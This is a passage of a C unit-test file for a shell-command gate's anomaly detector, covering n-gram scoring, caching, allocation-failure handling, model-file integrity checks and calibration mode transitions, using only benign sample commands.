       * evaluation after allocation recovers. */
      ASSERT_SG_OK(eval_cmd(actual_gate, cases[ci].target, &actual));
      ASSERT_SG_OK(eval_cmd(control_gate, cases[ci].target, &expected));
      assert_anomaly_results_equal(&actual, &expected);
      sg_gate_free(actual_gate);
      sg_gate_free(control_gate);
    }
  }
}

TEST(anomaly_type_netseq_allocation_failure) {
  static const char *command = "cat a ; grep b ; sort";
  sg_gate_t *probe = anomaly_gate_with_cache(1);
  ASSERT(probe != NULL);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(probe, command, &result));

  /* Force the cache-copy optimization to fall back to the authoritative type
   * builder, then measure its Shellsplit allocations. */
  sg_test_alloc_fail_at(1);
  shellsplit_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(probe, command, &result));
  size_t builder_allocations = shellsplit_test_alloc_count();
  sg_test_alloc_reset();
  shellsplit_test_alloc_reset();
  ASSERT(builder_allocations > 0);
  sg_gate_free(probe);

  for (size_t fail_at = 1; fail_at <= builder_allocations; fail_at++) {
    sg_gate_t *gate = anomaly_gate_with_cache(1);
    ASSERT(gate != NULL);
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    sg_test_alloc_fail_at(1);
    shellsplit_test_alloc_fail_at(fail_at);
    sg_error_t error = eval_cmd(gate, command, &result);
    sg_test_alloc_reset();
    shellsplit_test_alloc_reset();
    ASSERT(error == SG_ERR_MEMORY);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    sg_gate_free(gate);
  }
}

TEST(anomaly_model_failure_verdict_contract) {
  static const char *command = "cat a ; grep b ; sort";
  sg_result_t result = {0};

  sg_gate_t *gate = anomaly_gate_with_cache(0);
  ASSERT(gate != NULL);
  sg_test_anomaly_score_fail_with(SG_ANOMALY_ERR_MEMORY);
  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_MEMORY);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_test_anomaly_result_reset();
  sg_gate_free(gate);

  gate = anomaly_gate_with_cache(0);
  ASSERT(gate != NULL);
  sg_test_anomaly_score_fail_with(SG_ANOMALY_ERR_FORMAT);
  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_test_anomaly_result_reset();
  sg_gate_free(gate);

  gate = anomaly_gate_with_cache(0);
  ASSERT(gate != NULL);
  sg_test_anomaly_update_fail_with(SG_ANOMALY_ERR_FORMAT);
  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_test_anomaly_result_reset();
  sg_gate_free(gate);
}

TEST(anomaly_update_outcome_contract) {
  static const char *command = "cat a ; grep b ; sort";
  sg_result_t result = {0};

  sg_gate_t *disabled = sg_gate_new();
  ASSERT(disabled != NULL);
  ASSERT_SG_OK(eval_cmd(disabled, command, &result));
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED);
  sg_gate_free(disabled);

  sg_gate_t *updated = anomaly_gate_with_cache(0);
  ASSERT(updated != NULL);
  ASSERT_SG_OK(eval_cmd(updated, command, &result));
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  sg_gate_free(updated);

  sg_gate_t *allow_only = anomaly_gate_with_cache(0);
  ASSERT(allow_only != NULL);
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(allow_only, true));
  ASSERT_SG_OK(eval_cmd(allow_only, command, &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_SKIPPED_VERDICT);
  sg_gate_free(allow_only);

  char overlong[SG_ANOMALY_MAX_STAGE_LENGTH + 2];
  memset(overlong, 'x', sizeof(overlong) - 1);
  overlong[sizeof(overlong) - 1] = '\0';
  sg_gate_t *limited = anomaly_gate_with_cache(0);
  ASSERT(limited != NULL);
  ASSERT_SG_OK(eval_cmd(limited, overlong, &result));
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_REJECTED_LIMIT);
  sg_gate_free(limited);

  sg_gate_t *memory = anomaly_gate_with_cache(0);
  ASSERT(memory != NULL);
  sg_test_anomaly_update_fail_with(SG_ANOMALY_ERR_MEMORY);
  ASSERT_SG_OK(eval_cmd(memory, command, &result));
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_FAILED_MEMORY);
  sg_test_anomaly_result_reset();
  ASSERT(sg_gate_anomaly_had_error(memory));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(memory), 0);
  ASSERT_SG_OK(eval_cmd(memory, command, &result));
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  ASSERT(test_anomaly_vocabulary(memory) > 0);
  ASSERT(sg_gate_anomaly_had_error(memory));
  sg_gate_free(memory);

  sg_gate_t *format = anomaly_gate_with_cache(0);
  ASSERT(format != NULL);
  sg_test_anomaly_update_fail_with(SG_ANOMALY_ERR_FORMAT);
  ASSERT(eval_cmd(format, command, &result) == SG_ERR_PARSE);
  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_FAILED_FORMAT);
  sg_test_anomaly_result_reset();
  sg_gate_free(format);
}

TEST(anomaly_update_reuses_scored_netseq) {
  static const char *command = "cat a ; grep b ; sort";
  shell_netstring_buffer_t sequence = {0};
  size_t count = 0;
  shellsplit_test_alloc_reset();
  ASSERT(shell_build_command_netseq_buffer(command, strlen(command), NULL,
                                           &sequence,
                                           &count) == SHELL_PROCESS_OK);
  size_t one_build_allocations = shellsplit_test_alloc_count();
  shellsplit_test_alloc_reset();
  ASSERT(sequence.data != NULL && count == 3 && one_build_allocations > 0);
  shell_netstring_buffer_free(&sequence);

  sg_gate_t *gate = anomaly_gate_with_cache(1);
  ASSERT(gate != NULL);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, command, &result));

  shellsplit_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(shellsplit_test_alloc_count() == one_build_allocations);
  shellsplit_test_alloc_reset();
  sg_gate_free(gate);
}

TEST(anomaly_ansi_c_netseq_update) {
  sg_gate_t *gate = anomaly_gate_with_cache(1);
  ASSERT(gate != NULL);
  sg_result_t result;

  /* Source-derived fragments truncate before their anomaly stage is learned. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $'plain'", &result));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), 1);
  ASSERT_SG_OK(eval_cmd(gate, "printf $'a\\0b'", &result));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), 2);
  ASSERT_SG_OK(eval_cmd(gate, "printf $'ab'", &result));
  ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), 2);
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);

  /* A literal dollar followed by a closing shell quote is not ANSI-C syntax.
   * It must take the same cached, explicit-length raw-sequence path as every
   * other NUL-free command rather than relying on source-byte heuristics. */
  static const char *literal_dollar = "printf '$' ; printf '$' ; printf '$'";
  shell_netstring_buffer_t raw = {0};
  size_t count = 0;
  shellsplit_test_alloc_reset();
  ASSERT(shell_build_command_netseq_buffer(literal_dollar,
                                           strlen(literal_dollar), NULL, &raw,
                                           &count) == SHELL_PROCESS_OK);
  size_t raw_build_allocations = shellsplit_test_alloc_count();
  shellsplit_test_alloc_reset();
  ASSERT(count == 3 && raw_build_allocations > 0);
  shell_netstring_buffer_free(&raw);

  gate = anomaly_gate_with_cache(1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(eval_cmd(gate, literal_dollar, &result));
  shellsplit_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, literal_dollar, &result));
  ASSERT(shellsplit_test_alloc_count() == raw_build_allocations);
  shellsplit_test_alloc_reset();
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(anomaly_cache_model_transition_matrix) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = anomaly_gate_with_cache(0);
  ASSERT(source != NULL);
  sg_result_t result;
  static const char *training[] = {
      "ls ; cat file ; pwd", "cat file ; grep x ; sort",
      "echo hello ; sleep 1 ; true", "cp a b ; mv b c ; rm c"};
  for (size_t i = 0; i < 64; i++)
    ASSERT_SG_OK(eval_cmd(source, training[i % 4], &result));
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  sg_gate_t *cached = anomaly_gate_with_cache(2);
  sg_gate_t *control = anomaly_gate_with_cache(0);
  ASSERT(cached != NULL && control != NULL);
  ASSERT_SG_OK(sg_gate_load_anomaly_model(cached, path));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(control, path));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(cached, true));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(control, true));
  ASSERT_SG_OK(sg_gate_set_anomaly_adaptive(cached, true, 3));
  ASSERT_SG_OK(sg_gate_set_anomaly_adaptive(control, true, 3));
  ASSERT_SG_OK(sg_gate_set_anomaly_k_factor(cached, 1.5));
  ASSERT_SG_OK(sg_gate_set_anomaly_k_factor(control, 1.5));

  static const struct {
    size_t cache_size;
    const char *command;
    size_t fail_at;
  } transitions[] = {
      {(size_t)-1, "ls ; cat file ; pwd", 0},
      {(size_t)-1, "ls ; cat file ; pwd", 1}, /* hit-copy failure */
      {1, "cat file ; grep x ; sort", 0},     /* resize and miss */
      {(size_t)-1, "gcc ; make ; strip", 2},  /* insertion failure */
      {0, "echo hello ; sleep 1 ; true", 0},  /* disable */
      {4, "cp a b ; mv b c ; rm c", 0},       /* re-enable */
      {(size_t)-1, "cp a b ; mv b c ; rm c", 0},
  };
  for (size_t i = 0; i < sizeof(transitions) / sizeof(transitions[0]); i++) {
    if (transitions[i].cache_size != (size_t)-1)
      ASSERT_SG_OK(
          sg_gate_set_anomaly_cache_size(cached, transitions[i].cache_size));
    sg_result_t actual, expected;
    if (transitions[i].fail_at)
      sg_test_alloc_fail_at(transitions[i].fail_at);
    ASSERT_SG_OK(eval_cmd(cached, transitions[i].command, &actual));
    sg_test_alloc_reset();
    ASSERT_SG_OK(eval_cmd(control, transitions[i].command, &expected));
    assert_anomaly_results_equal(&actual, &expected);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(cached),
                   test_anomaly_vocabulary(control));
  }

  char truncated[1024] = {0};
  size_t used = 0;
  for (size_t i = 0; i < 70; i++)
    used += (size_t)snprintf(truncated + used, sizeof(truncated) - used,
                             i == 0 ? "x" : " ; x");
  sg_result_t actual, expected;
  sg_error_t actual_error = eval_with_prefix(cached, truncated, 8192, &actual);
  sg_error_t expected_error =
      eval_with_prefix(control, truncated, 8192, &expected);
  ASSERT(actual_error == SG_ERR_TRUNC && expected_error == SG_ERR_TRUNC);
  ASSERT(actual.truncated && expected.truncated);
  ASSERT(actual.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(expected.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(cached),
                 test_anomaly_vocabulary(control));

  sg_gate_free(control);
  sg_gate_free(cached);
  sg_gate_free(source);
}

/* --- SEPARATE SCORE TESTS --- */

TEST(anomaly_short_aligned_sequence_stays_finite) {
  /* Raw and type netsequences are aligned records from one parse. A short
   * sequence deliberately has no n-gram score, so every reported component
   * must be finite zero rather than an internal INFINITY. */
  sg_gate_t *g = sg_gate_new();
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));

  sg_result_t r;
  ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
  ASSERT_SG_OK(eval_cmd(g, "p", &r));
  ASSERT(isfinite(r.anomaly_score));
  ASSERT(isfinite(r.anomaly_score_raw));
  ASSERT(isfinite(r.anomaly_score_type));
  ASSERT(r.anomaly_score_type == 0.0);

  sg_gate_free(g);
}

TEST(truncated_parse_without_subcommands_is_undetermined) {
  /* Group-owned redirect documents are built before their command bodies.
   * Fill the node budget with 32 groups and 96 documents: no CMD can fit, but
   * the truncated graph must not be treated as an evaluated empty list. */
  char cmd[2048] = "";
  for (unsigned i = 0; i < 32; i++)
    strcat(cmd, "{ ");
  strcat(cmd, "echo;");
  for (unsigned i = 0; i < 32; i++) {
    char tail[64];
    snprintf(tail, sizeof(tail), " } <in%u >out%u 2>err%u%s", i, i, i,
             i == 31 ? "" : ";");
    strcat(cmd, tail);
  }
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);

  sg_result_t r;
  sg_error_t err = eval_with_prefix(g, cmd, 8192, &r);
  ASSERT_EQ_UINT(r.subcommand_count, 0);
  ASSERT(r.truncated);
  ASSERT_EQ_INT(err, SG_ERR_TRUNC);
  ASSERT_EQ_INT(r.verdict, SG_VERDICT_UNDETERMINED);

  /* Token-budget exhaustion now retains cd's ordinary command endpoint. */
  strcpy(cmd, "cd");
  size_t used = 2;
  for (size_t i = 0; i < 400; i++) {
    cmd[used++] = ' ';
    cmd[used++] = 'x';
  }
  cmd[used] = '\0';
  err = eval_with_prefix(g, cmd, 8192, &r);
  ASSERT_EQ_UINT(r.subcommand_count, 1);
  ASSERT(r.truncated && err == SG_ERR_TRUNC &&
         r.verdict == SG_VERDICT_UNDETERMINED);

  sg_gate_free(g);
}

/* --- BAYESIAN COMBINATION TESTS --- */

static const char *const calibration_commands[] = {
    "ls ; cat file.txt ; pwd",
    "cat file.txt ; grep pattern ; sort",
    "echo hello ; sleep 1 ; true",
    "cp a b ; mv b c ; rm c",
};

/* Freeze learning after training so calibration transitions can be compared
 * without replacing the score population under test. No allow rules means
 * update-only-on-allow skips learning but still collects normal history. */
static sg_gate_t *calibration_gate(size_t samples) {
  sg_gate_t *gate = sg_gate_new();
  if (!gate)
    return NULL;
  sg_result_t result;
  bool ok = sg_gate_enable_anomaly(gate, 100.0, NULL) == SG_OK;
  for (size_t i = 0; ok && i < samples; i++)
    ok = eval_cmd(gate, calibration_commands[i % 4], &result) == SG_OK;
  ok = ok && sg_gate_set_anomaly_update_mode(gate, true) == SG_OK;
  if (!ok) {
    sg_gate_free(gate);
    return NULL;
  }
  return gate;
}

static SHELL_NONNULL(1, 2, 3) bool calibration_score(
    sg_gate_t *gate, const char *source, sg_anomaly_sequence_score_t *out) {
  shell_netstring_buffer_t raw = {0}, type = {0};
  size_t count = 0;
  bool ok =
      shell_build_anomaly_netseqs_buffer(source, strlen(source), NULL, &raw,
                                         &type, &count) == SHELL_PROCESS_OK &&
      sg_gate_score_anomaly_netseq(gate, (const char *)raw.data, raw.length,
                                   (const char *)type.data, type.length,
                                   out) == SG_OK;
  shell_netstring_buffer_free(&type);
  shell_netstring_buffer_free(&raw);
  return ok;
}

typedef struct {
  sg_gate_t *source;
  char path[256];
  size_t size;
  size_t raw_size;
  long raw_alpha_offset;
  long type_alpha_offset;
} test_bundle_fixture_t;

/* A real serialized model, large enough that the type header remains unread
 * after the first payload chunk even with stdio read-ahead. Caller frees source
 * on success or failure and unlinks a nonempty path; fixture starts zeroed. */
static SHELL_NONNULL(1) bool test_bundle_fixture_create(
    test_bundle_fixture_t *fixture) {
  int fd = temp_fixture_file(fixture->path, sizeof(fixture->path),
                             "shellgate-bundle-snapshot");
  if (fd < 0) {
    fixture->path[0] = '\0';
    return false;
  }
  if (close(fd) != 0)
    return false;
  fixture->source = sg_gate_new();
  if (!fixture->source)
    return false;
  sg_anomaly_config_t config;
  sg_anomaly_config_default(&config);
  config.alpha = 0.25;
  bool ok = sg_gate_enable_anomaly(fixture->source, 100.0, &config) == SG_OK &&
            sg_gate_set_stop_mode(fixture->source, SG_EVAL_ALL) == SG_OK &&
            sg_gate_set_suggestions(fixture->source, false) == SG_OK;
  sg_result_t result;
  for (size_t batch = 0; ok && batch < 8; batch++) {
    char commands[1024];
    size_t used = 0;
    for (size_t command = 0; command < 32; command++) {
      int length = snprintf(commands + used, sizeof(commands) - used,
                            "%scorpus_stage_%03zu", command ? "; " : "",
                            batch * 32 + command);
      if (length < 0 || (size_t)length >= sizeof(commands) - used) {
        ok = false;
        break;
      }
      used += (size_t)length;
    }
    ok = ok && eval_cmd(fixture->source, commands, &result) == SG_OK;
  }
  ok =
      ok && sg_gate_save_anomaly_model(fixture->source, fixture->path) == SG_OK;
  if (!ok)
    return false;
  FILE *file = fopen(fixture->path, "rb");
  if (!file)
    return false;
  unsigned char header[32];
  ok = fread(header, 1, sizeof(header), file) == sizeof(header) &&
       fseek(file, 0, SEEK_END) == 0;
  long size = ok ? ftell(file) : -1;
  ok = ok && size > 32;
  if (ok) {
    fixture->size = (size_t)size;
    fixture->raw_size = (size_t)test_load_u64_le(header + 8);
    ok = fixture->raw_size > 16384 + BUFSIZ &&
         fixture->raw_size < fixture->size - 32;
  }
  for (unsigned model = 0; ok && model < 2; model++) {
    char line[128];
    long start = model ? (long)(32 + fixture->raw_size) : 32;
    ok = fseek(file, start, SEEK_SET) == 0 &&
         fgets(line, sizeof(line), file) != NULL;
    long numeric_header = ok ? ftell(file) : -1;
    ok = ok && numeric_header >= 0 && fgets(line, sizeof(line), file) != NULL &&
         strncmp(line, "# 0.25 ", 7) == 0;
    if (ok) {
      long *offset =
          model ? &fixture->type_alpha_offset : &fixture->raw_alpha_offset;
      *offset = numeric_header + 4; /* Change 0.25 to valid 0.75. */
    }
  }
  return fclose(file) == 0 && ok;
}

typedef enum {
  TEST_BUNDLE_CHANGE_STAGED,
  TEST_BUNDLE_CHANGE_UNREAD,
  TEST_BUNDLE_APPEND,
  TEST_BUNDLE_TRUNCATE,
} test_bundle_mutation_t;

typedef struct {
  const test_bundle_fixture_t *fixture;
  test_bundle_mutation_t mutation;
  FILE *source_stream;
  size_t bytes_read;
  bool mutated;
  bool mutation_ok;
} test_bundle_read_t;

/* Mutate through a separate file handle only after a specific source read has
 * completed. No sleeps, threads, or source-buffer changes. Staging streams are
 * created while the source stream is alive, so their FILE pointers are
 * distinct.
 */
static SHELL_NONNULL(1, 3) void test_bundle_mutate_after_read(FILE *stream,
                                                              size_t length,
                                                              void *context) {
  test_bundle_read_t *state = context;
  if (!state->source_stream)
    state->source_stream = stream;
  if (stream != state->source_stream)
    return;
  state->bytes_read += length;
  if (length == 0) {
    sg_test_io_read_observer_set(NULL, NULL);
    return;
  }
  if (state->mutated)
    return;
  bool after_payload = state->mutation == TEST_BUNDLE_CHANGE_STAGED ||
                       state->mutation == TEST_BUNDLE_APPEND;
  if (after_payload ? state->bytes_read < state->fixture->size
                    : state->bytes_read <= 32)
    return;
  state->mutated = true;
  if (state->mutation == TEST_BUNDLE_TRUNCATE) {
    state->mutation_ok =
        truncate(state->fixture->path,
                 (off_t)(32 + state->fixture->raw_size / 2)) == 0;
    return;
  }
  FILE *file = fopen(state->fixture->path, "r+b");
  if (!file)
    return;
  long offset = state->mutation == TEST_BUNDLE_CHANGE_UNREAD
                    ? state->fixture->type_alpha_offset
                    : state->fixture->raw_alpha_offset;
  bool ok = state->mutation == TEST_BUNDLE_APPEND
                ? fseek(file, 0, SEEK_END) == 0
                : fseek(file, offset, SEEK_SET) == 0;
  ok = ok &&
       fputc(state->mutation == TEST_BUNDLE_APPEND ? 'x' : '7', file) != EOF;
  state->mutation_ok = fclose(file) == 0 && ok;
}

TEST(anomaly_bundle_verified_snapshot) {
  test_bundle_fixture_t fixture = {0};
  sg_gate_t *target = sg_gate_new();
  bool ok = target && test_bundle_fixture_create(&fixture) &&
            sg_gate_enable_anomaly(target, 100.0, NULL) == SG_OK;
  test_bundle_read_t read = {.fixture = &fixture,
                             .mutation = TEST_BUNDLE_CHANGE_STAGED};
  sg_error_t status = SG_ERR_INVALID;
  if (ok) {
    sg_test_io_read_observer_set(test_bundle_mutate_after_read, &read);
    status = sg_gate_load_anomaly_model(target, fixture.path);
    sg_test_io_reset();
  }
  /* The bytes changed on disk were already staged. Accepting the verified
   * snapshot is valid, but rereading any payload byte is not. */
  ok = ok && read.mutated && read.mutation_ok && status == SG_OK &&
       read.bytes_read == fixture.size &&
       test_anomaly_vocabulary(target) ==
           test_anomaly_vocabulary(fixture.source);
  sg_anomaly_sequence_score_t expected = {0}, actual = {0};
  ok = ok && calibration_score(fixture.source, "unseen_stage", &expected) &&
       calibration_score(target, "unseen_stage", &actual) &&
       actual.raw_score == expected.raw_score &&
       actual.type_score == expected.type_score &&
       actual.combined_score == expected.combined_score;
  /* The same on-disk mutation has an invalid checksum on the next load. */
  ok = ok && sg_gate_load_anomaly_model(target, fixture.path) == SG_ERR_PARSE &&
       calibration_score(target, "unseen_stage", &actual) &&
       actual.raw_score == expected.raw_score &&
       actual.type_score == expected.type_score;
  sg_gate_free(target);
  sg_gate_free(fixture.source);
  if (fixture.path[0])
    ok = unlink(fixture.path) == 0 && ok;
  ASSERT(ok);
}

static bool test_bundle_rejected_mutation(test_bundle_mutation_t mutation,
                                          bool bayesian) {
  test_bundle_fixture_t fixture = {0};
  sg_gate_t *target = calibration_gate(40);
  sg_gate_t *control = calibration_gate(40);
  bool ok = target && control && test_bundle_fixture_create(&fixture);
  sg_gate_t *gates[] = {target, control};
  sg_result_t result;
  for (size_t gate = 0; ok && gate < 2; gate++) {
    ok = sg_gate_set_anomaly_cache_size(gates[gate], 4) == SG_OK &&
         sg_gate_set_anomaly_adaptive(gates[gate], true, 4) == SG_OK &&
         sg_gate_set_anomaly_k_factor(gates[gate], 0.0) == SG_OK;
    if (bayesian)
      ok = ok && sg_gate_set_anomaly_combine_mode(
                     gates[gate], SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
    for (size_t sample = 0; ok && sample < 8; sample++)
      ok = eval_cmd(gates[gate], calibration_commands[0], &result) == SG_OK;
  }
  size_t vocabulary = target ? test_anomaly_vocabulary(target) : 0;
  sg_anomaly_sequence_score_t before = {0}, after = {0};
  ok = ok && calibration_score(target, "gcc ; make ; strip", &before) &&
       before.detected;
  test_bundle_read_t read = {.fixture = &fixture, .mutation = mutation};
  sg_error_t status = SG_ERR_INVALID;
  if (ok) {
    sg_test_io_read_observer_set(test_bundle_mutate_after_read, &read);
    status = sg_gate_load_anomaly_model(target, fixture.path);
    sg_test_io_reset();
  }
  ok = ok && read.mutated && read.mutation_ok && status == SG_ERR_PARSE &&
       test_anomaly_vocabulary(target) == vocabulary &&
       calibration_score(target, "gcc ; make ; strip", &after) &&
       after.raw_score == before.raw_score &&
       after.type_score == before.type_score &&
       after.combined_score == before.combined_score &&
       after.detected == before.detected;
  if (ok) {
    if (mutation == TEST_BUNDLE_TRUNCATE)
      ok = read.bytes_read < fixture.size;
    else
      ok = read.bytes_read == fixture.size + (mutation == TEST_BUNDLE_APPEND);
  }
  /* Retaining identical numeric results is not sufficient to prove the cache
   * survived. A cache miss also adds key/signature allocations. */
  sg_result_t expected;
  if (ok) {
    sg_test_alloc_reset();
    shellsplit_test_alloc_reset();
    ok = eval_cmd(control, calibration_commands[0], &expected) == SG_OK;
    size_t gate_allocations = sg_test_alloc_count();
    size_t split_allocations = shellsplit_test_alloc_count();
    sg_test_alloc_reset();
    shellsplit_test_alloc_reset();
    ok = ok && eval_cmd(target, calibration_commands[0], &result) == SG_OK &&
         sg_test_alloc_count() == gate_allocations &&
         shellsplit_test_alloc_count() == split_allocations &&
         result.anomaly_score_raw == expected.anomaly_score_raw &&
         result.anomaly_score_type == expected.anomaly_score_type &&
         result.anomaly_score == expected.anomaly_score &&
         result.anomaly_detected == expected.anomaly_detected &&
         result.anomaly_update == expected.anomaly_update;
    sg_test_alloc_reset();
    shellsplit_test_alloc_reset();
  }
  if (!ok)
    printf("    bundle mutation %d, Bayesian %d, status %d, bytes %zu/%zu\n",
           mutation, bayesian, status, read.bytes_read, fixture.size);
  sg_gate_free(control);
  sg_gate_free(target);
  sg_gate_free(fixture.source);
  if (fixture.path[0])
    ok = unlink(fixture.path) == 0 && ok;
  return ok;
}

TEST(anomaly_bundle_mutation_failure_atomicity) {
  for (unsigned bayesian = 0; bayesian < 2; bayesian++) {
    ASSERT(test_bundle_rejected_mutation(TEST_BUNDLE_CHANGE_UNREAD, bayesian));
    ASSERT(test_bundle_rejected_mutation(TEST_BUNDLE_APPEND, bayesian));
    ASSERT(test_bundle_rejected_mutation(TEST_BUNDLE_TRUNCATE, bayesian));
  }
}

TEST(anomaly_adaptive_default_k_factor) {
  sg_gate_t *gate = calibration_gate(100);
  ASSERT(gate != NULL);
  bool ok = sg_gate_set_anomaly_adaptive(gate, true, 4) == SG_OK;
  sg_result_t result;
  for (size_t i = 0; ok && i < 4; i++)
    ok = eval_cmd(gate, calibration_commands[i], &result) == SG_OK &&
         !result.anomaly_detected;
  /* This trained score is above the window mean but below mean + 3*stddev.
   * A zero-initialized multiplier would incorrectly detect it. */
  ok = ok && eval_cmd(gate, calibration_commands[0], &result) == SG_OK &&
       !result.anomaly_detected;
  sg_gate_free(gate);
  ASSERT(ok);
}

TEST(anomaly_calibration_mode_changes) {
  sg_gate_t *gate = calibration_gate(100);
  ASSERT(gate != NULL);
  bool ok = sg_gate_set_anomaly_adaptive(gate, true, 4) == SG_OK &&
            sg_gate_set_anomaly_k_factor(gate, 3.0) == SG_OK &&
            sg_gate_set_anomaly_combine_mode(
                gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
  sg_result_t result;
  for (size_t i = 0; ok && i < 12; i++) {
    ok = eval_cmd(gate, calibration_commands[i % 4], &result) == SG_OK &&
         !result.anomaly_detected;
    if (ok && i >= 4)
      ok = result.anomaly_score == 0.0;
  }
  /* The Bayesian window contains zeros. Those log-odds observations must not
   * become a zero bits/stage threshold when weighted scoring resumes. */
  ok = ok && sg_gate_set_anomaly_combine_mode(
                 gate, SG_ANOMALY_COMBINE_WEIGHTED) == SG_OK;
  for (size_t i = 0; ok && i < 4; i++)
    ok = eval_cmd(gate, calibration_commands[i], &result) == SG_OK &&
         result.anomaly_score > 0.0 && !result.anomaly_detected;
  ok = ok && eval_cmd(gate, "gcc ; make ; strip", &result) == SG_OK &&
       result.anomaly_detected;
  /* Existing component histograms are reusable, but the combined adaptive
   * window must warm up again on a return to ready Bayesian scoring. */
  ok = ok && sg_gate_set_anomaly_combine_mode(
                 gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
  for (size_t i = 0; ok && i < 4; i++)
    ok = eval_cmd(gate, calibration_commands[i], &result) == SG_OK &&
         result.anomaly_score == 0.0 && !result.anomaly_detected;
  sg_gate_free(gate);
  ASSERT(ok);
}

TEST(bayesian_adaptive_effective_transition) {
  sg_gate_t *gate = calibration_gate(100);
  ASSERT(gate != NULL);
  bool ok = sg_gate_set_anomaly_adaptive(gate, true, 4) == SG_OK &&
            sg_gate_set_anomaly_combine_mode(
                gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
  sg_result_t result;
  for (size_t i = 0; ok && i < 4; i++)
    ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
  /* Histogram readiness changes the effective score definition. The weighted
   * window must be discarded, not immediately applied to log-odds. Read-only
   * probes must not themselves advance either warm-up. */
  sg_anomaly_sequence_score_t score = {0};
  for (size_t i = 0; ok && i < 4; i++) {
    ok = calibration_score(gate, "gcc ; make ; strip", &score) &&
         score.combined_score > 1.0 && !score.detected;
    if (ok)
      ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK &&
           result.anomaly_score == 0.0 && !result.anomaly_detected;
  }
  ok = ok && calibration_score(gate, "gcc ; make ; strip", &score) &&
       score.detected;
  double preserved = score.combined_score;
  /* Same-mode setters and weights ignored by ready Bayesian scoring must not
   * erase an armed log-odds window or its component distributions. */
  ok = ok &&
       sg_gate_set_anomaly_combine_mode(gate, SG_ANOMALY_COMBINE_BAYESIAN) ==
           SG_OK &&
       sg_gate_set_anomaly_weights(gate, 0.25, 0.75) == SG_OK &&
       calibration_score(gate, "gcc ; make ; strip", &score) &&
       score.combined_score == preserved && score.detected;
  sg_gate_free(gate);
  ASSERT(ok);
}

TEST(anomaly_weight_calibration_transitions) {
  sg_gate_t *gate = calibration_gate(100);
  ASSERT(gate != NULL);
  bool ok = sg_gate_set_anomaly_adaptive(gate, true, 3) == SG_OK;
  sg_result_t result;
  for (unsigned transition = 0; ok && transition < 2; transition++) {
    for (size_t i = 0; ok && i < 3; i++)
      ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
    sg_anomaly_sequence_score_t score = {0};
    ok = ok && calibration_score(gate, "gcc ; make ; strip", &score) &&
         score.detected;
    double raw = transition == 0 ? 0.5 : 1.0;
    double type = 1.0 - raw;
    ok = ok && sg_gate_set_anomaly_weights(gate, raw, type) == SG_OK &&
         calibration_score(gate, "gcc ; make ; strip", &score) &&
         score.detected;
    /* Identical settings above are a no-op. Changing the weighted definition
     * below starts a fresh adaptive window, retaining the trained models. */
    double next_raw = transition == 0 ? 1.0 : 0.0;
    ok = ok &&
         sg_gate_set_anomaly_weights(gate, next_raw, 1.0 - next_raw) == SG_OK;
    ok = ok && calibration_score(gate, "gcc ; make ; strip", &score) &&
         !score.detected;
  }
  sg_gate_free(gate);
  ASSERT(ok);
}

TEST(bayesian_warmup_configuration_order) {
  bool ok = true;
  for (unsigned order = 0; ok && order < 3; order++) {
    sg_gate_t *gate = calibration_gate(100);
    ASSERT(gate != NULL);
    if (order == 0)
      ok = sg_gate_set_anomaly_combine_mode(
               gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
    ok = ok && sg_gate_set_anomaly_adaptive(gate, true, 4) == SG_OK;
    if (order == 2)
      ok = ok && sg_gate_set_anomaly_adaptive(gate, false, 0) == SG_OK;
    if (order != 0)
      ok = ok && sg_gate_set_anomaly_combine_mode(
                     gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
